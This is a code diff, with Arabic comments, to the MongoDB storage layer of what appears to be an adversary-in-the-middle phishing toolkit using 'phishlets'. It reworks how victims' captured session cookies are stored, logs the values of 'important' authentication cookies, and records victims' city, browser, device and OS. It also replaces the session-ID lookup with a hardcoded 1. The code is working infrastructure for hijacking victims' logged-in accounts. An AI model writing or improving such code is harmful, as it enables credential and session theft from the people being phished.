@@ -277,8 +277,10 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
 		return 0, err
 	}
-	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.ID.Timestamp())
-	return int(session.ID.Timestamp()), nil
+	
+	// استخدام قيمة عددية بدلاً من timestamp
+	log.Debug("[MongoDB] آخر معرف جلسة: %d", 1)
+	return 1, nil
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
@@ -308,7 +310,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
 	newSession := &MongoSession{
-		ID:           primitive.NewObjectIDFromTimestamp(now),
+		ID:           primitive.NewObjectID(), // سينشئ معرف جديد تلقائياً
 		SID:          sid,
 		Name:         phishlet,
 		Username:     "",
@@ -517,26 +519,9 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 		return err
 	}
 	
-	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
-	cookieTokens := make(map[string]map[string]interface{})
-	
-	// حفظ الكوكيز الحالية إذا كانت موجودة
-	if session.CookieTokens != nil {
-		// نسخ الكوكيز الحالية
-		for domain, domainTokens := range session.CookieTokens {
-			cookieTokens[domain] = make(map[string]interface{})
-			for name, token := range domainTokens {
-				cookieTokens[domain][name] = token
-			}
-		}
-	}
-	
-	// تحديث/إضافة الكوكيز الجديدة
+	// تحويل الكوكيز إلى التنسيق المناسب
+	var cookieTokensArray []MongoCookieToken
 	for domain, domainTokens := range tokens {
-		if _, ok := cookieTokens[domain]; !ok {
-			cookieTokens[domain] = make(map[string]interface{})
-		}
-		
 		for name, token := range domainTokens {
 			isImportant := false
 			// التحقق مما إذا كان الكوكي مهماً
@@ -547,38 +532,28 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 				}
 			}
 			
-			// حفظ الكوكي مع قيمته
-			cookieData := map[string]interface{}{
-				"name":      token.Name,
-				"value":     token.Value,
-				"path":      token.Path,
-				"http_only": token.HttpOnly,
+			// إضافة الكوكي إلى المصفوفة
+			mct := MongoCookieToken{
+				Name:     token.Name,
+				Value:    token.Value,
+				Domain:   domain,
+				Path:     token.Path,
+				HttpOnly: token.HttpOnly,
+				JSON:     false,
 			}
+			cookieTokensArray = append(cookieTokensArray, mct)
 			
-			// استخدام الاسم الأصلي (مع الحفاظ على حالة الأحرف) للكوكيز المهمة
 			if isImportant {
 				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
-				cookieTokens[domain][name] = cookieData
-				
-				// أيضاً، حفظه باسم مطابق 100% للقائمة المهمة للتأكد
-				for _, importantName := range importantCookies {
-					if strings.EqualFold(name, importantName) {
-						cookieTokens[domain][importantName] = cookieData
-						log.Success("[MongoDB] تحويل كوكي مهم باسمه الأصلي: %s = %s", importantName, token.Value)
-					}
-				}
-			} else {
-				cookieTokens[domain][name] = cookieData
 			}
 		}
 	}
 	
-	// حفظ كل الكوكيز مرة واحدة
+	// تحديث الجلسة
 	now := time.Now().UTC().Unix()
-	
 	update := bson.M{
 		"$set": bson.M{
-			"cookie_tokens": cookieTokens,
+			"cookie_tokens": cookieTokensArray,
 			"update_time":   now,
 		},
 	}
@@ -599,30 +574,16 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	if err != nil {
 		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
 	} else {
-		// التحقق من وجود المجالات والكوكيز
-		if updatedSession.CookieTokens != nil {
-			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز بعد التحديث", len(updatedSession.CookieTokens))
+		// التحقق من وجود الكوكيز
+		if len(updatedSession.CookieTokens) > 0 {
+			log.Debug("[MongoDB] التحقق: تم استرداد %d كوكي بعد التحديث", len(updatedSession.CookieTokens))
 			
-			// طباعة محتويات الكوكيز المحفوظة
-			for domain, domainTokens := range updatedSession.CookieTokens {
-				log.Debug("[MongoDB] المجال المحفوظ: %s (عدد الكوكيز: %d)", domain, len(domainTokens))
-				
-				// البحث عن الكوكيز المهمة في البيانات المستردة
-				for tokenName, tokenValue := range domainTokens {
-					// التحقق مما إذا كان الكوكي مهماً
-					for _, importantName := range importantCookies {
-						if strings.EqualFold(tokenName, importantName) {
-							// طباعة قيمة الكوكي المهم
-							log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s في المجال %s", tokenName, domain)
-							// طباعة قيمة الكوكي إذا أمكن استخراجها
-							if tokenMap, ok := tokenValue.(map[string]interface{}); ok {
-								if value, hasValue := tokenMap["value"]; hasValue {
-									log.Success("[MongoDB] قيمة الكوكي المهم المحفوظ %s = %v", tokenName, value)
-								}
-							} else {
-								log.Debug("[MongoDB] نوع قيمة الكوكي: %T", tokenValue)
-							}
-						}
+			// البحث عن الكوكيز المهمة في البيانات المستردة
+			for _, token := range updatedSession.CookieTokens {
+				// التحقق مما إذا كان الكوكي مهماً
+				for _, importantName := range importantCookies {
+					if strings.EqualFold(token.Name, importantName) {
+						log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s = %s في المجال %s", token.Name, token.Value, token.Domain)
 					}
 				}
 			}
@@ -804,18 +765,32 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 	return nil
 }
 
-func (d *Database) SetSessionCityInfo(sid string, city string) {
-	s := &core.Session{}
-	s.Id = sid
-	s.City = city
-	d.UpdateSession(s)
+func (d *Database) SetSessionCityInfo(sid string, city string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	
+	// إضافة البيانات للحقول المخصصة
+	s.Custom["city"] = city
+	s.UpdateTime = time.Now().UTC().Unix()
+	
+	err = d.sessionsUpdate(s.Id, s)
+	return err
 }
 
-func (d *Database) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) {
-	s := &core.Session{}
-	s.Id = sid
-	s.Browser = browser
-	s.DeviceType = deviceType
-	s.OS = os
-	d.UpdateSession(s)
+func (d *Database) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	
+	// إضافة البيانات للحقول المخصصة
+	s.Custom["browser"] = browser
+	s.Custom["device_type"] = deviceType
+	s.Custom["os"] = os
+	s.UpdateTime = time.Now().UTC().Unix()
+	
+	err = d.sessionsUpdate(s.Id, s)
+	return err
 } 
